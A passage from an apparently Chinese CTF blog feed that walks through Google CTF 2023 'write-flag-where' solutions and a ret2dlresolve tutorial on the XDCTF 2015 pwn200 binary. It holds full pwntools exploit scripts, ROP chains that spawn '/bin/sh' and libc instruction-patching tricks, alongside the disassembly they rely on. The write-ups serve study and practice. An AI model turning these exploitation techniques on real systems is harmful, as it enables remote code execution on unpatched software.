<span class="type">int</span>(sh.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)    </span></span><br><span class="line"><span class="string">    sh.recvuntil(b&#x27;</span>\n\n\n<span class="number">&#x27;</span>)    </span><br><span class="line">    sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (image_addr+<span class="number">0x20BC</span>-offset, offset+<span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    sh.send((<span class="string">&#x27;%cx%lx %u\n&#x27;</span> % (chr, image_addr, <span class="number">0</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    try:        </span><br><span class="line">        sh.recvn(<span class="number">1</span>, timeout=<span class="number">1</span>)        </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> True    </span><br><span class="line">    except EOFError:       </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;_&#123;&#125;?&#x27;</span> + <span class="built_in">string</span>.digits + <span class="built_in">string</span>.ascii_lowercase + <span class="built_in">string</span>.ascii_uppercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">while(True):    </span></span><br><span class="line"><span class="string">    find = False    </span></span><br><span class="line"><span class="string">    for chr in table:        </span></span><br><span class="line"><span class="string">        if leak(len(flag), chr):            </span></span><br><span class="line"><span class="string">            find = True            </span></span><br><span class="line"><span class="string">            flag += chr            </span></span><br><span class="line"><span class="string">            print(flag)            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    if not find:      </span></span><br><span class="line"><span class="string">        print(flag)              </span></span><br><span class="line"><span class="string">        break</span></span><br></pre></td></tr></table></figure><h3 id="WRITE-FLAG-WHERE3"><a href="#WRITE-FLAG-WHERE3" class="headerlink" title="WRITE-FLAG-WHERE3"></a>WRITE-FLAG-WHERE3</h3><p>多了改写位置的判断<code>|| *(_QWORD *)&amp;n[1] &gt;= (unsigned __int64)main - 20480 &amp;&amp; (unsigned __int64)main + 20480 &gt;= *(_QWORD *)&amp;n[1] )</code></p><p>不能是main-20480到main+20480之间，只能时libc和栈区</p><p>Ex师傅的思路就是改write的的第一个参数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000114</span>A20</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               fd= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               buf= qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20                               count= qword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A20 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64                                 ; Alternative name is <span class="string">&#x27;__write&#x27;</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A24 <span class="number">64</span> <span class="number">8B</span> <span class="number">04</span> <span class="number">25</span> <span class="number">18</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov     eax, fs:<span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A2C <span class="number">85</span> C0                         test    eax, eax</span><br><span class="line">.text:<span class="number">0000000000114</span>A2E <span class="number">75</span> <span class="number">10</span>                         jnz     <span class="type">short</span> loc_114A40</span><br><span class="line">.text:<span class="number">0000000000114</span>A2E</span><br><span class="line">.text:<span class="number">0000000000114</span>A30 B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A35 <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000114</span>A37 <span class="number">48</span> <span class="number">3</span>D <span class="number">00</span> F0 FF FF             cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text:<span class="number">0000000000114</span>A3D <span class="number">77</span> <span class="number">51</span>                         ja      <span class="type">short</span> loc_114A90</span><br><span class="line">.text:<span class="number">0000000000114</span>A3D</span><br><span class="line">.text:<span class="number">0000000000114</span>A3F C3                            retn</span><br><span class="line">.text:<span class="number">0000000000114</span>A3F</span><br><span class="line">.text:<span class="number">0000000000114</span>A40                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000114</span>A40</span><br><span class="line">.text:<span class="number">0000000000114</span>A40                               loc_114A40:                             ; CODE XREF: write+E↑j</span><br><span class="line">.text:<span class="number">0000000000114</span>A40 <span class="number">48</span> <span class="number">83</span> EC <span class="number">28</span>                   sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000114</span>A44 <span class="number">48</span> <span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">18</span>                mov     [rsp+<span class="number">28</span>h+count], rdx</span><br><span class="line">.text:<span class="number">0000000000114</span>A49 <span class="number">48</span> <span class="number">89</span> <span class="number">74</span> <span class="number">24</span> <span class="number">10</span>                mov     [rsp+<span class="number">28</span>h+buf], rsi</span><br><span class="line">.text:<span class="number">0000000000114</span>A4E <span class="number">89</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">08</span>                   mov     dword ptr [rsp+<span class="number">28</span>h+fd], edi</span><br><span class="line">.text:<span class="number">0000000000114</span>A52 E8 <span class="number">19</span> C0 F7 FF                call    sub_90A70</span><br><span class="line">.text:<span class="number">0000000000114</span>A52</span><br><span class="line">.text:<span class="number">0000000000114</span>A57 <span class="number">48</span> <span class="number">8B</span> <span class="number">54</span> <span class="number">24</span> <span class="number">18</span>                mov     rdx, [rsp+<span class="number">28</span>h+count]            ; count</span><br><span class="line">.text:<span class="number">0000000000114</span>A5C <span class="number">48</span> <span class="number">8B</span> <span class="number">74</span> <span class="number">24</span> <span class="number">10</span>                mov     rsi, [rsp+<span class="number">28</span>h+buf]              ; buf</span><br><span class="line">.text:<span class="number">0000000000114</span>A61 <span class="number">41</span> <span class="number">89</span> C0                      mov     r8d, eax</span><br><span class="line">.text:<span class="number">0000000000114</span>A64 <span class="number">8B</span> <span class="number">7</span>C <span class="number">24</span> <span class="number">08</span>                   mov     edi, dword ptr [rsp+<span class="number">28</span>h+fd]     ; fd</span><br><span class="line">.text:<span class="number">0000000000114</span>A68 B8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000114</span>A6D <span class="number">0F</span> <span class="number">05</span>                         syscall                                 ; LINUX - sys_write</span><br><span class="line">.text:<span class="number">0000000000114</span>A6F <span class="number">48</span> <span class="number">3</span>D <span class="number">00</span> F0 FF FF             cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF000h</span><br><span class="line">.text:<span class="number">0000000000114</span>A75 <span class="number">77</span> <span class="number">31</span>                         ja      <span class="type">short</span> loc_114AA8</span><br><span class="line">.text:<span class="number">0000000000114</span>A75</span><br><span class="line">.text:<span class="number">0000000000114</span>A77</span><br><span class="line">.text:<span class="number">0000000000114</span>A77                               loc_114A77:                             ; CODE XREF: write+<span class="number">9B</span>↓j</span><br><span class="line">.text:<span class="number">0000000000114</span>A77 <span class="number">44</span> <span class="number">89</span> C7                      mov     edi, r8d</span><br></pre></td></tr></table></figure><p>首先我们需要控制fs:18h不为0,但是我们又不能直接控制fs:18,我们只能填写0x43，有些系统调用在出错设置errno时会根据errno在got里的值将出错码写入fsbase+*errno_got的位置</p><p>所以可以故意调用出错控制fs:0x43位置的值不为0，然后 mov     eax, fs:18h改为mov     eax, fs:43h绕过</p><blockquote><p>ida导出表里找到errno，再ctrl x找交叉引用就可以找到errno got表位置为0x218E10</p></blockquote><p>参数就是从这里来的<code>.text:0000000000114A64 8B 7C 24 08                   mov     edi, dword ptr [rsp+28h+fd]</code>也就是rsp+8的位置</p><p>我们可以改为rsp+0x43，这样就可以提前用main函数里的<code> v7 = read(v8, buf, 0x40uLL);</code>来布置好参数为我们想要的1337</p><p>直接贴一下Ex师傅的exp吧</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;wfw3.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">result = sh.recvuntil(b<span class="number">&#x27;.</span>so<span class="number">&#x27;</span>).split(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">libc_addr = <span class="type">int</span>(result[:<span class="number">12</span>], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + hex(libc_addr))</span><br><span class="line">sh.recvuntil(b<span class="number">&#x27;</span>\n\n\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="meta">#errnogot表里一般是0xffffffffffffff80，只能修改一个字节为C，所以先用0去填充</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span><span class="number">-0x70</span>, <span class="number">0x78</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x218e10</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">#让close系统调用号变为<span class="number">0x43</span>,即shmdt,参数不合法会导致出错设置errno</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x115110</span>+<span class="number">1</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">#修改write的mov     eax, fs:<span class="number">18</span>h为mov     eax, fs:<span class="number">43</span>h</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A28</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line">#把write第一个参数改为esp+<span class="number">0x43</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_addr + <span class="number">0x114A67</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (<span class="number">0</span>, <span class="number">0x70</span>)).encode().ljust(<span class="number">0x13</span>, b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>) + p32(<span class="number">1337</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>另一种解法是利用指令前缀0x43来操作exit函数</p><blockquote><p>REX前缀的值介于40h到4Fh之间，具体取值取决于所期望的特定的扩展寄存器的组合。<strong>一条指令只能有一个REX前缀，必须紧接在指令的第一个操作码字节之前。 REX前缀在其他任何位置都将被忽略。</strong></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000000455F</span>0                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000000455F</span>0 F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64</span><br><span class="line">.text:<span class="number">00000000000455F</span>4 <span class="number">50</span>                            push    rax</span><br><span class="line">.text:<span class="number">00000000000455F</span>5 <span class="number">58</span>                            pop     rax</span><br><span class="line">.text:<span class="number">00000000000455F</span>6 B9 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     ecx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000000455F</span>B BA <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     edx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000045600</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">35</span> <span class="number">31</span> <span class="number">42</span> <span class="number">1</span>D <span class="number">00</span>          lea     rsi, off_219838</span><br><span class="line">.text:<span class="number">0000000000045607</span> <span class="number">48</span> <span class="number">83</span> EC <span class="number">08</span>                   sub     rsp, <span class="number">8</span><span class="comment">//可以改为 43 83 EC 08    sub r12d, 8</span></span><br><span class="line">.text:<span class="number">000000000004560B</span> E8 <span class="number">80</span> FD FF FF                call    sub_45390</span><br><span class="line">.text:<span class="number">000000000004560B</span>                               ; &#125; <span class="comment">// starts at 455F0//43 80 FD FF    cmp r13b, 0xff</span></span><br><span class="line">                                                         <span class="comment">//最后一个ff改为指令前缀43</span></span><br><span class="line">.text:<span class="number">000000000004560B</span></span><br><span class="line">.text:<span class="number">000000000004560B</span>                               <span class="built_in">exit</span> endp</span><br><span class="line">.text:<span class="number">000000000004560B</span></span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span>                               ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span></span><br><span class="line">.text:<span class="number">0000000000045610</span>                               public on_exit ; weak</span><br><span class="line">.text:<span class="number">0000000000045610</span>                               on_exit proc near                       ; DATA XREF: LOAD:<span class="number">000000000000B</span>550↑o</span><br><span class="line">.text:<span class="number">0000000000045610</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000045610</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA                   endbr64<span class="comment">//43434343</span></span><br><span class="line">.text:<span class="number">0000000000045614</span> <span class="number">41</span> <span class="number">54</span>                         push    r12</span><br><span class="line">.text:<span class="number">0000000000045616</span> <span class="number">55</span>                            push    rbp</span><br><span class="line">.text:<span class="number">0000000000045617</span> <span class="number">53</span>                            push    rbp<span class="comment">// push    rbp  push    rbp任意一个改为指令前缀</span></span><br><span class="line">.text:<span class="number">0000000000045618</span> <span class="number">48</span> <span class="number">85</span> FF                      test    rdi, rdi<span class="comment">//434343</span></span><br><span class="line">..........</span><br><span class="line">.text:<span class="number">0000000000045679</span>                               loc_45679:                              ; CODE XREF: on_exit+<span class="number">8</span>E↓j</span><br><span class="line">.text:<span class="number">0000000000045679</span>                                                                       ; on_exit+<span class="number">98</span>↓j</span><br><span class="line">.text:<span class="number">0000000000045679</span> <span class="number">44</span> <span class="number">89</span> E0                      mov     eax, r12d</span><br><span class="line">.text:<span class="number">000000000004567</span>C <span class="number">5B</span>                            pop     rbx</span><br><span class="line">.text:<span class="number">000000000004567</span>D <span class="number">5</span>D                            pop     rbp</span><br><span class="line">.text:<span class="number">000000000004567</span>E <span class="number">41</span> <span class="number">5</span>C                         pop     r12</span><br><span class="line">.text:<span class="number">0000000000045680</span> C3                            retn</span><br></pre></td></tr></table></figure><p>push    rbp  push    rbp任意一个改为指令前缀都会导致后面多pop一个参数，retn时正好时我们main函数里输入buf的位置，可以结合基地址进行rop</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/">http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/</a></p><p><a href="https://zhuanlan.zhihu.com/p/639991243">https://zhuanlan.zhihu.com/p/639991243</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve</title>
      <link href="/2023/07/09/ret2dlresolve/"/>
      <url>/2023/07/09/ret2dlresolve/</url>
      
        <content type="html"><![CDATA[<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>贴一下hollk师傅博客里的一张图片 <a href="https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_41202237/article/details/107378159?spm=1001.2014.3001.5501</a></p><p><img src="/2023/07/09/ret2dlresolve/image-20230711215322463.png" alt="image-20230711215322463"></p><p>_dl_runtime_resolve(link_map_obj, reloc_index),第一个linkmap即为got表第二项，linkmap可以找到**.dynamic<strong>的位置，第二个参数为即为plt里push的数，为要找的符号的重定位项在</strong>rel.plt**表里偏移，rel.plt里是Elf32_Rel结构体</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/15944406.html">https://www.cnblogs.com/ZIKH26/articles/15944406.html</a></p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO-RELRO"></a>NO-RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/no-relro&gt; checksec main_no_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>看了下最简单利用就是vuln函数的溢出和write泄露libc基地址，然后用onegadget拿shell</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./main_no_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">write=elf.plt[b<span class="string">&quot;write&quot;</span>]</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(write)+p32(<span class="number">0x80485AE</span>)+p32(<span class="number">1</span>)+p32(elf.got[b<span class="number">&#x27;</span>write<span class="number">&#x27;</span>])+p32(<span class="number">0x10</span>)</span><br><span class="line">sla(b<span class="number">&#x27;</span>XDCTF2015~!\n<span class="number">&#x27;</span>,payload)</span><br><span class="line">write_ad=u32(r(<span class="number">4</span>))</span><br><span class="line">p(<span class="string">&#x27;write_ad&#x27;</span>,write_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_ad)</span><br><span class="line">base=write_ad-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">gadget=base+<span class="number">0x172841</span></span><br><span class="line">db(<span class="string">&#x27;b *0x804851A&#x27;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0x666</span>)+p32(gadget)</span><br><span class="line"><span class="meta"># sla(b<span class="string">&#x27;XDCTF2015~!\n&#x27;</span>,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>动态链接器会从<code>.dynamic</code> 节中索引到各个目标节，_dl_runtime_resolve延迟解析符号的地址时，是依据符号的名字进行解析的</p><p>我们可以改掉.dynstr来实现控制</p><p>.dynamic</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Sword    d_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">   Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">   Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line"> &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p><img src="/2023/07/09/ret2dlresolve/image-20230708121848040.png" alt="image-20230708121848040"></p><blockquote><p>可以用readelf -S找到dynamic节位置，然后根据dynamic的Addr去ida里看，ida已经帮我们分析好了，不知道各位师傅还有没有更方便的方法，求告知</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -S main_no_relro_32</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al </span><br><span class="line">[<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure><p><img src="/2023/07/09/ret2dlresolve/image-20230708122318087.png" alt="image-20230708122318087"></p></blockquote><p>伪造一个把read改为system的dynstr节来替换原来的节，read函数已经被解析放到了got里(jmp *got)，不会走_dl_runtime_resolve，所以要返回到他plt的第二条指令</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta"># context.log_level=<span class="string">&quot;debug&quot;</span></span></span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">p.recvuntil(b<span class="number">&#x27;</span>Welcome to XDCTF2015~!\n<span class="number">&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x08048376&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="meta"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()<span class="meta">#get the data of .dynstr section </span></span><br><span class="line">print(b<span class="number">&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">dynstr = dynstr.replace(b&quot;read&quot;,b&quot;system&quot;)#replace the section data </span></span><br><span class="line"><span class="string">print(b&#x27;</span>*<span class="string">&#x27;*10)</span></span><br><span class="line"><span class="string">print(dynstr)</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section</span></span><br><span class="line"><span class="string">rop.read(0,0x080498E0+0x100,len(b&quot;/bin/sh\x00&quot;)) # read /bin/sh\x00</span></span><br><span class="line"><span class="string">rop.raw(0x08048376) # the second instruction of read@plt </span></span><br><span class="line"><span class="string">rop.raw(0xdeadbeef)</span></span><br><span class="line"><span class="string">rop.raw(0x080498E0+0x100)</span></span><br><span class="line"><span class="string"># print(rop.dump())</span></span><br><span class="line"><span class="string">assert(len(rop.chain())&lt;=256)</span></span><br><span class="line"><span class="string">rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span></span><br><span class="line"><span class="string">p.send(rop.chain())</span></span><br><span class="line"><span class="string">p.send(p32(0x080498E0))</span></span><br><span class="line"><span class="string">p.send(dynstr)</span></span><br><span class="line"><span class="string"># p.send(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/s/c/p/s/x/r/<span class="number">2</span>/<span class="number">3</span>/partial-relro&gt; checksec main_partial_relro_32</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/share/ctfwiki/pwn/stack_overflow/x86/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>.dynamic 节将会变成只读的</p><p>思路就是rop到_dl_runtime_resolve(plt0)函数配合伪造的rel.plt里的Elf32_Rel，Elf32_Rel里的r_info&gt;&gt;8指向伪造的.dynsym符号表Elf32_Sym的下标,Elf32_Sym里的st_name指向伪造的dynstr字符串表的偏移来调用任意函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word    r_info;<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><p><strong>r_offset</strong>表示要修正的位置第一个字节相对于这个段的偏移</p><p>r_info 低8位表示要重定位类型，高24位是符号在符号表里的下标</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">    Elf32_Addr    st_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">    Elf32_Word    st_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>    st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">    Elf32_Section    st_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main_partial_relro_32&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: 